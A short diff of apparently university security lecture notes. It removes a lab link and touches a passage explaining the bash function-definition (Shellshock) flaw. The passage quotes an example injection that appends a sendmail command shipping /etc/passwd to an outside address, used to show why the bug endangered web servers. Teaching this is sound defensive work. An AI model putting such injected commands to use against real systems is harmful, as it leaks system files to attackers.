@@ -11,11 +11,6 @@ include-before: |
   ```
 ---
 
-### Lab-related
-
-Stack frame details: see
-
-<https://people.cs.rutgers.edu/~pxk/419/notes/frames.html>
 
 
 ### Highlights
@@ -467,7 +462,7 @@ commands at the *end* of such a function definition.
 
 `sayhi() { echo "hi"; }; sendmail me@me.com </etc/passwd`
 
-A major problem, since 
+A major problem, since
 many web servers at the time
 allowed web requests to be handled by scripts,
 and passed attacker-controllable information about a web request in
